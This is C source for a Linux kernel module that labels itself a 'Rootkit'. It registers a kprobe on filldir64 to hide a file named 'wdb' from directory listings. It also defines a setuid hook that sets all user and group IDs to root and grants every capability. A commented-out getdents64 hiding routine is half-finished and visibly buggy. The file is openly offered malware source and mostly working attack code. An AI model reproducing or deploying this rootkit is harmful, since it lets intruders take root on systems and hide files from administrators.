#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/capability.h>
#include <linux/sched.h>
#include <linux/kprobes.h>
#include <linux/atomic.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/ptrace.h>
#include <linux/fs.h>

#include <linux/uaccess.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("otitoko");
MODULE_DESCRIPTION("Rootkit");
MODULE_VERSION("0.1");


#define MAGIC_UID 50

#define _GLOBAL_ROOT_UID 0
#define _GLOBAL_ROOT_GID 0

struct getdents_callback64{
	struct dir_context ctx;
	struct linux_dirent64 __user * current_dir;
	int prev_reclen;
	int count;
	int error;
};



void __x64_sys_setuid_post_handler(struct kprobe *kp, struct pt_regs *regs, unsigned long flags)
{
    printk(KERN_INFO "setuid hook called, elevating privs...");

    struct cred *new_creds = prepare_creds();

    new_creds->uid.val=_GLOBAL_ROOT_UID;
    new_creds->euid.val=_GLOBAL_ROOT_UID;
    new_creds->suid.val=_GLOBAL_ROOT_UID;
    new_creds->fsuid.val=_GLOBAL_ROOT_UID;

    new_creds->gid.val=_GLOBAL_ROOT_GID;
    new_creds->egid.val=_GLOBAL_ROOT_GID;
    new_creds->sgid.val=_GLOBAL_ROOT_GID;
    new_creds->fsgid.val=_GLOBAL_ROOT_GID;

    new_creds->cap_inheritable=CAP_FULL_SET;
    new_creds->cap_permitted=CAP_FULL_SET;
    new_creds->cap_effective=CAP_FULL_SET;
    new_creds->cap_bset=CAP_FULL_SET;
    commit_creds(new_creds);
}
/* Hiding our files from ls */
const char *hidden_filenames[1]={"wdb"};
static char symbol[KSYM_NAME_LEN]="filldir64";
module_param_string(symbol, symbol, KSYM_NAME_LEN, 0644);
/* struct for info to be passed from entry handler to post handler */
struct getdents_data{
    int fd;
    struct linux_dirent64 *dirent_buf;
    int count;
    int skip_file;
};

static struct kprobe kp={
    .symbol_name        =symbol,
};


static int __kprobes pre_handler(struct kprobe *p, struct pt_regs *regs){
    char * filename = (char *)regs->si;

	printk(KERN_INFO "<%s> p->addr = 0x%p, ip = %lx, rdi=%lx, rsi=%s ,flags = 0x%lx\n",
		p->symbol_name, p->addr, regs->ip, regs->di, (char *)regs->si, regs->flags);
		if (strcmp(filename, hidden_filenames[0]) == 0) {
			strcpy((char *)regs->si, "\x00");
		}
	return 0;
}

/*
static int __x64_sys_getdents64_entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs){
	printk(KERN_INFO "stepping through entry handler");
	struct getdents_data *data;
	data = (struct getdents_data *)ri->data;


	char * filename=(char *)regs->si
	printk(KERN_INFO "getdents raw fd: %ld",regs->di);
	data->fd=regs->di;
	data->dirent_buf=regs->si;
	data->count=regs->dx;

	printk(KERN_INFO "getdents called with fd: %d",data->fd);


	return 0;
}

static int __x64_sys_getdents64_post_handler(struct kretprobe_instance *ri, struct pt_regs *regs){

	printk(KERN_INFO "executing __x64_sys_getdents64_post_handler");
	struct getdents_data *data=(struct getdents_data *)ri->data;

	ssize_t ret = regs_return_value(regs);
	int dirfd=data->fd;
	unsigned long count=regs->dx;

	if(dirfd<0)
		printk(KERN_ERR "conductor...we have a problem");

//	printk(KERN_INFO "getdents called with fd: %d and count %lx",dirfd,count);
	struct linux_dirent64 *current_dir,*dirent_ker=NULL;
	unsigned long offset = 0;


	printk(KERN_INFO "getdents returned %d bytes", ret);

	if(ret<=regs->dx){
		printk(KERN_DEBUG "ret is less than count");
	}
	
	char *kbuf=kzalloc(ret,GFP_KERNEL);
	if(!kbuf)
		printk(KERN_ERR "couldn't allocate mem");
	printk(KERN_DEBUG "mem allocated: %ld bytes",ret);


	//dentrydata debugging
	if((unsigned long)data>=TASK_SIZE){
		printk("why is dentry data in kernel space");
		return -EFAULT;
	}
	if(!data){
		printk(KERN_ERR "dentry data null");
		return -EFAULT;
	}


	if( (ret<=0) || (kbuf == NULL) )
		return ret;
//access_ok(dentry_data,ret) breaks this
	if(access_ok(data,ret)){
		printk(KERN_DEBUG "acces is ok ");
	}
	else{
		printk(KERN_DEBUG "access not ok");
	}
	
	
	long error = copy_from_user(kbuf,data,ret);
	if(error){
		printk(KERN_ERR "could not copy %ld bytes from user",ret);
		printk(KERN_ERR "copy_from_user error: %ld",error);
	}
	while(offset<ret){
		current_dir = (void *)kbuf+offset;
		printk(KERN_INFO "d_name of the current dir is: %l", current_dir->d_name);

		offset+=current_dir->d_reclen;
	}

//	error=copy_to_user(dentry_data,kbuf,ret);

		return 0;
}

static struct kretprobe  __x64_sys_getdents64_hook= {
	.entry_handler		= __x64_sys_getdents64_entry_handler,
	.handler 		= __x64_sys_getdents64_post_handler,
	.kp.symbol_name		="__x64_sys_getdents64",
	.data_size		=sizeof(struct getdents_data),
	.maxactive		=20,
};
*/

struct kprobe __x64_sys_setuid_hook = {
        .symbol_name = "__x64_sys_setuid",
        .post_handler = __x64_sys_setuid_post_handler,
};

static int __init rkin(void)
{
    printk(KERN_INFO "module loaded\n");
 /*   int setuid_registered = register_kprobe(&__x64_sys_setuid_hook);
    int getdents64_registered = register_kretprobe(&__x64_sys_getdents64_hook);
    if (setuid_registered < 0 || getdents64_registered < 0)
    {
        printk(KERN_INFO "failed to register setuid kprobes\n");
    }
    else
    {
        printk(KERN_INFO "hooks registered\n");
        atomic_inc(&hooked);
    }
*/
    kp.pre_handler=pre_handler;
    int ret=register_kprobe(&kp);
    if(ret<0){
        printk(KERN_ERR"could not register handler");
	return ret;
    }
    return 0;
}

static void __exit rkout(void)
{
    /*
    if (atomic_read(&hooked))
    {
	unregister_kretprobe(&__x64_sys_getdents64_hook);
        unregister_kprobe(&__x64_sys_setuid_hook);
        printk(KERN_INFO "unhooked\n");
    }*/
    unregister_kprobe(&kp);
    
}

module_init(rkin);
module_exit(rkout);

